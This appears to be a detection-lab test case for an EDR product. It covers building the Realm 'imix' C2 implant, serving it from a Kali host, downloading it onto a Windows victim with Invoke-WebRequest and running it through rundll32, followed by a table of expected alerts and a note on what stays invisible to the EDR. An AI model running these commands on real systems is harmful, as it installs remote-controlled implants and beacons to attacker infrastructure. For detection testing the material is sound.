# Test: Execution — implant DLL via rundll32 (LOLBIN execution)

**Chain:** the DLL build of imix (`imix.dll`) executed through signed `rundll32` — the
Cobalt Strike spawn posture. Tests argument-less-interpreter and DLL-write detections.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
cargo build --release --lib                      # DLL build for this test
cp target/release/imix.dll ~/sideload-lab/
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
Invoke-WebRequest http://172.16.69.109:8000/imix.dll -OutFile C:\Users\Public\imix.dll
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


```bash
cd ~/realm/implants/imix && cargo build --release --lib
cp target/release/imix.dll ~/sideload-lab/ && cd ~/sideload-lab && python3 -m http.server 8000
```

**Victim (elevated PowerShell):**

```powershell
Invoke-WebRequest http://172.16.69.109:8000/imix.dll -OutFile C:\Users\Public\update.dll
rundll32 C:\Users\Public\update.dll,Start        # full form
rundll32                                          # argument-less = CS spawn posture
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `SIG-REALM-IMPLANT` etc. | crit/high | DLL write into \Users\Public scanned |
| `PROC-RUNDLL-NOARG` | medium | argument-less rundll32 (second form) |
| `EVT-4688-TEMP` | high | rundll32/imix activity from user paths |
| `NET-BEACON` | critical | if the DLL callbacks (gRPC-capable builds) |

**Known gap:** no module-load telemetry — an unsigned DLL inside signed rundll32 is
invisible as such; you catch the file write + consequences.

**Cleanup:** `..\..\poc-scripts\victim\05-full-cleanup.ps1`
